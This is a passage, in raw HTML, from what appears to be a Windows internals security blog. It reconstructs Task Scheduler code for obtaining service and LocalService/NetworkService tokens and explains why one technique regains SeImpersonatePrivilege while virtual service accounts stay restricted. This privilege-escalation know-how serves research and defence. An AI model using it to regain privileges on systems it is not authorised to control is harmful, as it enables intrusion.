normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;User </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NetworkService\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">else</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">EqualSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrinicpalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> kLocalService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;Domain </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"NT AUTHORITY\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;User </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: grey; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">L\"LocalService\"</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;HANDLE Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">if</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">LogonUserExExW</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Domain</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Password</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LOGON32_LOGON_SERVICE</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;LOGON32_PROVIDER_DEFAULT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">))</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">// ...</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: green; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"><span style=\"color: navy; font-weight: 700;\">}</span></span></p><div><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\"><br /></span></div><p>This&nbsp;<i>UbpmpTokenGetNonInteractiveToken </i>function is taking the principal SID from the task registration or passed to <i>RunEx </i>and determining what it represents to get back the token. It checks if the SID is a service SID, by which is means the <i>NT SERVICE\\NAME</i>&nbsp;SID we used in the previous blog post. If it is it calls a separate function,&nbsp;<i>UbpmpTokenGetServiceAccountToken</i> to get the service token.</p><p>Otherwise if the SID is NS or LS then it specifies the well know names for those SIDs and called <a href=\"https://docs.microsoft.com/en-us/windows/win32/secauthn/logonuserexexw\">LogonUserExEx</a> with the&nbsp;<i>LOGON32_LOGON_SERVICE</i> type. The <i>UbpmpTokenGetServiceAccountToken</i> function does the following:</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">TOKEN UbpmpTokenGetServiceAccountToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PSID PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">) </span><span>{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;LPCWSTR Name </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> UbpmUtilsGetAccountNamesFromSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">PrincipalSid</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;SC_HANDLE scm </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenSCManager</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">NULL</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SC_MANAGER_CONNECT</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;SC_HANDLE service </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">=</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> OpenService</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">scm</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Name</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> SERVICE_ALL_ACCESS</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;HANDLE Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;GetServiceProcessToken</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">g_ScheduleServiceHandle</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> service</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">,</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">);</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;</span><span style=\"background-color: white; color: blue; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">return</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> Token</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">}</span></p><p>This function gets the name from the service SID, which is the name of the service itself and opens it for all access rights (<i>SERVICE_ALL_ACCESS</i>). If that succeeds then it passes the service handle to an undocumented SCM API,&nbsp;<i>GetServiceProcessToken</i>, which returns the token for the service. Looking at the implementation in SCM this basically uses the exact same code as it would use for creating the token for starting the service.&nbsp;</p><p>This is why there's a distinction between LS/NS and a virtual service account using&nbsp;Cl\u00e9ment's technique. If you use LS/NS the task scheduler gets a fresh token from the LSA with no regards to how the service is configured. Therefore the new token has <i>SeImpersonatePrivilege </i>(or what ever else is allowed). However for a virtual service account the service asks the SCM for the service's token, as the SCM knows about what restrictions are in place it honours things like privileges or the SID type. Therefore the returned token will be stripped of <i>SeImpersonatePrivilege </i>again even though it'll technically be a different token to the currently running service.</p><p>Why does the task scheduler need some undocumented function to get the service token? As I mentioned in a <a href=\"https://www.tiraniddo.dev/2020/10/creating-your-own-virtual-service.html\">previous blog post</a> about virtual accounts only the SCM (well technically the first process to claim it's the SCM) is allowed to authenticate a token with a virtual service account. This seems kind of pointless if you ask me as you already need <i>SeTcbPrivilege </i>to create the service token, but it is what it is.</p><p>Okay, so now we know why Cl\u00e9ment's technique doesn't get you back any privileges. You might now be asking, so what? Well one interesting behavior came from looking at how the task scheduler determines if you're allowed to specify a service SID as a principal. In my blog post of creating a task running as <i>TrustedInstaller </i>I implied it needed administrator access, which is sort of true and sort of not. Let's see the function the task scheduler uses to determine if the caller's allowed to run a task as a specified principal.</p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">BOOL IsPrincipalAllowed</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">(</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">&amp;</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> principal</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">)</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\"> </span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">{</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">RpcAutoImpersonate</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">();</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;User caller</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">;</span></p><p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 400; text-decoration: none; vertical-align: baseline; white-space: pre;\">&nbsp;&nbsp;User</span><span style=\"background-color: white; color: navy; font-family: 'Courier New'; font-size: 10pt; font-style: normal; font-variant: normal; font-weight: 700; text-decoration: none; vertical-align: baseline; white-space: pre;\">::</span><span style=\"background-color: white; color: black; font-family: 'Courier New'; font-size: 